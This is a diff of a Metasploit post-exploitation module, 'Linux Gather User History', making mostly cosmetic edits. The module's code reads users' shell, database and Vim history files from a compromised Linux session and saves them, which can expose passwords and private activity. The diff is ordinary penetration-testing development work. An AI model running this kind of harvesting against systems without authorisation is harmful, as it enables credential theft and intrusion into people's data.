@@ -13,21 +13,21 @@ class Metasploit3 < Msf::Post
 
   def initialize(info = {})
     super(update_info(info,
-        'Name'         => 'Linux Gather User History',
-        'Description'  => %q{
-          This module gathers user specific information.
-          User shell history, MySQL history, PostgreSQL history,
-          MongoDB history, vim history, lastlog and sudoers.
-        },
-        'License'      => MSF_LICENSE,
-        'Author'       =>
-          [
-            # based largely on get_bash_history function by Stephen Haywood
-            'ohdae <bindshell[at]live.com>'
-          ],
-        'Platform'     => ['linux'],
-        'SessionTypes' => ['shell', 'meterpreter']
-      ))
+      'Name'         => 'Linux Gather User History',
+      'Description'  => %q{
+        This module gathers the following user-specific information:
+        shell history, MySQL history, PostgreSQL history, MongoDB history,
+        Vim history, lastlog, and sudoers.
+      },
+      'License'      => MSF_LICENSE,
+      'Author'       =>
+        [
+          # based largely on get_bash_history function by Stephen Haywood
+          'ohdae <bindshell[at]live.com>'
+        ],
+      'Platform'     => ['linux'],
+      'SessionTypes' => ['shell', 'meterpreter']
+    ))
   end
 
   def run
@@ -42,7 +42,7 @@ class Metasploit3 < Msf::Post
     users = [user] if user != 'root' || users.blank?
 
     vprint_status("Retrieving history for #{users.length} users")
-    shells = %w{ ash bash csh ksh sh tcsh zsh }
+    shells = %w{ash bash csh ksh sh tcsh zsh}
     users.each do |u|
       home = get_home_dir(u)
       shells.each do |shell|
@@ -93,43 +93,42 @@ class Metasploit3 < Msf::Post
     home = execute("echo ~#{user}")
     if home.empty?
       if user == 'root'
-        return '/root'
+        home = '/root'
       else
-        return "/home/#{user}"
+        home = "/home/#{user}"
       end
     end
     home
   end
 
   def get_shell_history(user, home, shell)
-    return if shell.nil?
     vprint_status("Extracting #{shell} history for #{user}")
     hist = cat_file("#{home}/.#{shell}_history")
-    save("#{shell} History for #{user}", hist) unless hist.blank? || hist =~ /No such file or directory/
+    save("#{shell} history for #{user}", hist) unless hist.blank? || hist =~ /No such file or directory/
   end
 
   def get_mysql_history(user, home)
     vprint_status("Extracting MySQL history for #{user}")
     sql_hist = cat_file("#{home}/.mysql_history")
-    save("MySQL History for #{user}", sql_hist) unless sql_hist.blank? || sql_hist =~ /No such file or directory/
+    save("MySQL history for #{user}", sql_hist) unless sql_hist.blank? || sql_hist =~ /No such file or directory/
   end
 
   def get_psql_history(user, home)
     vprint_status("Extracting PostgreSQL history for #{user}")
     sql_hist = cat_file("#{home}/.psql_history")
-    save("PostgreSQL History for #{user}", sql_hist) unless sql_hist.blank? || sql_hist =~ /No such file or directory/
+    save("PostgreSQL history for #{user}", sql_hist) unless sql_hist.blank? || sql_hist =~ /No such file or directory/
   end
 
   def get_mongodb_history(user, home)
     vprint_status("Extracting MongoDB history for #{user}")
     sql_hist = cat_file("#{home}/.dbshell")
-    save("MongoDB History for #{user}", sql_hist) unless sql_hist.blank? || sql_hist =~ /No such file or directory/
+    save("MongoDB history for #{user}", sql_hist) unless sql_hist.blank? || sql_hist =~ /No such file or directory/
   end
 
   def get_vim_history(user, home)
-    vprint_status("Extracting VIM history for #{user}")
+    vprint_status("Extracting Vim history for #{user}")
     vim_hist = cat_file("#{home}/.viminfo")
-    save("VIM History for #{user}", vim_hist) unless vim_hist.blank? || vim_hist =~ /No such file or directory/
+    save("Vim history for #{user}", vim_hist) unless vim_hist.blank? || vim_hist =~ /No such file or directory/
   end
-end
 
+end
